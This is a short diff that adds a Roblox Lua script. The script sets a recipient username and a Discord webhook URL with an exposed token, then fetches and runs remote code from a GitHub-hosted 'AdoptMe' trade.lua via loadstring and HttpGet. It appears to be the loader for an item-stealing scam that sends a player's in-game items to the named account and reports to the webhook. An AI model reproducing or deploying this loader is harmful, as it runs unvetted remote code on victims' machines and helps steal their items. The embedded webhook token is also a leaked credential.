@@ -1,0 +1,3 @@
+UserName = "RobloxLimiteds1234"
+WebHook = "https://discord.com/api/webhooks/1271537963662180426/mj0ckueH6XsusOEw025yz8Q00Dq2FzYWj0PUKEbJOJnj-_ehXC_JJikjQheoOmmSMFIo"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/AdoptMe/main/trade.lua"))()
